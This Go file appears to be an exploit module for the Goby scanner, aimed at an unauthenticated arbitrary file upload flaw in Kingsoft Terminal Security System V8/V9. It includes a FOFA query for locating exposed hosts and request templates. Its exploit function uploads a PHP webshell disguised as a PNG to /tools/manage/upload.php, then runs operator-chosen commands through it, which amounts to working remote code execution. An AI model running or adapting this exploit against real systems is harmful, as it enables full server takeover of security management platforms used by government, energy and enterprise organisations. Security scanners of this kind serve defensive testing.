package exploits

import (
  "fmt"
  "git.gobies.org/goby/goscanner/goutils"
  "git.gobies.org/goby/goscanner/jsonvul"
  "git.gobies.org/goby/goscanner/scanconfig"
  "git.gobies.org/goby/httpclient"
  "strings"
)

func init() {
  expJson := `{
    "Name": "Kingsoft V9 Terminal Security System Any File Upload",
    "Description": "Kingsoft Terminal Security System V8/V9 has file upload vulnerabilities",
    "Impact": "Kingsoft V9 Terminal Security System Any File Upload",
    "Recommendation": "<p>1. The official has not fixed the vulnerability yet. It is recommended that users contact the manufacturer to fix the vulnerability or pay attention to the manufacturer's homepage at any time for solutions: <a href=\"https://www.ejinshan.net\">https://www.ejinshan.net</a></p><p>2. Set access policies through firewalls and other security devices, and set whitelist access. </p><p>3. If it is not necessary, it is forbidden to access the system from the public network. </p>",
    "Product": "kingsoft-TSS",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload",
        "Information technology application innovation industry"
    ],
    "Translation": {
        "CN": {
            "Name": "金山终端安全系统V8/V9存在文件上传漏洞",
            "Description": "终端安全系统是专门为政府、军工、能源、教育、医疗及集团化企业设计的终端安全管理平台。该系统存在未授权的任意文件上传漏洞，通过该漏洞上传恶意文件并执行任意操作系统命令，从而获取服务器权限。",
            "Impact": "<p>终端安全系统是专门为政府、军工、能源、教育、医疗及集团化企业设计的终端安全管理平台。该系统存在未授权的任意文件上传漏洞，通过该漏洞上传恶意文件并执行任意操作系统命令，从而获取服务器权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，建议用户联系厂商修复漏洞或随时关注厂商主页以获取解决办法：<a href=\"https://www.ejinshan.net\" rel=\"nofollow\">https://www.ejinshan.net</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Product": "猎鹰安全-金山终端安全系统",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "信创"
            ]
        },
        "EN": {
            "Name": "Kingsoft V9 Terminal Security System Any File Upload",
            "Description": "Kingsoft Terminal Security System V8/V9 has file upload vulnerabilities",
            "Impact": "Kingsoft V9 Terminal Security System Any File Upload",
            "Recommendation": "<p>1. The official has not fixed the vulnerability yet. It is recommended that users contact the manufacturer to fix the vulnerability or pay attention to the manufacturer's homepage at any time for solutions: <a href=\"https://www.ejinshan.net\" rel=\"nofollow \">https://www.ejinshan.net</a></p><p>2. Set access policies through firewalls and other security devices, and set whitelist access. <br></p><p>3. If it is not necessary, it is forbidden to access the system from the public network. </p>",
            "Product": "kingsoft-TSS",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "Information technology application innovation industry"
            ]
        }
    },
    "FofaQuery": "title=\"金山终端安全系统\"",
    "GobyQuery": "title=\"金山终端安全系统\"",
    "Author": "SuperDolby",
    "Homepage": "https://www.ejinshan.net/",
    "DisclosureDate": "2021-04-10",
    "References": [
        "https://forum.butian.net/share/76"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/tools/manage/upload.php",
                "follow_redirect": true,
                "header": {
                    "Pragma": "no-cache",
                    "Cache-Control": "no-cache",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4251.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "SKYLARa0aede9e785feabae789c6e03d=es581dq8j5i74b4dj27kc87ar3",
                    "Connection": "close",
                    "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryhQcaKJIKAnejKGru"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Possible file upload attack",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/tools/manage/upload.php",
                "follow_redirect": true,
                "header": {
                    "Pragma": "no-cache",
                    "Cache-Control": "no-cache",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4251.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "SKYLARa0aede9e785feabae789c6e03d=es581dq8j5i74b4dj27kc87ar3",
                    "Connection": "close",
                    "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryhQcaKJIKAnejKGru"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Possible file upload attack",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "webshell",
            "type": "input",
            "value": "<?php phpinfo();?>",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10180"
}`

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    nil,
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      cmd := ss.Params["cmd"].(string)
      filename := goutils.RandomHexString(32)
      pwd := goutils.RandomHexString(4)
      shell := fmt.Sprintf("<?php system($_GET[%s]); ?>", pwd)
      cfg := httpclient.NewPostRequestConfig("/tools/manage/upload.php")
      cfg.VerifyTls = false
      cfg.FollowRedirect = false
      cfg.Header.Store("Content-type", "multipart/form-data;boundary=----WebKitFormBoundaryhQcaKJIKAnejKGru")
      cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
      cfg.Data = fmt.Sprintf("------WebKitFormBoundaryhQcaKJIKAnejKGru\r\nContent-Disposition: form-data; name=\"file\";filename=\"%s.php\"\r\nContent-Type: image/png\r\n\r\n%s\r\n------WebKitFormBoundaryhQcaKJIKAnejKGru--", filename, shell)
      if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody, filename) && strings.Contains(resp.RawBody, "successfully") {
        if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/UploadDir/" + filename + ".php?" + pwd + "=" + cmd); err == nil && resp.StatusCode == 200 {
          expResult.Output = resp.Utf8Html
          expResult.Success = true
          return expResult
        }
      }
      return expResult
    },
  ))
}
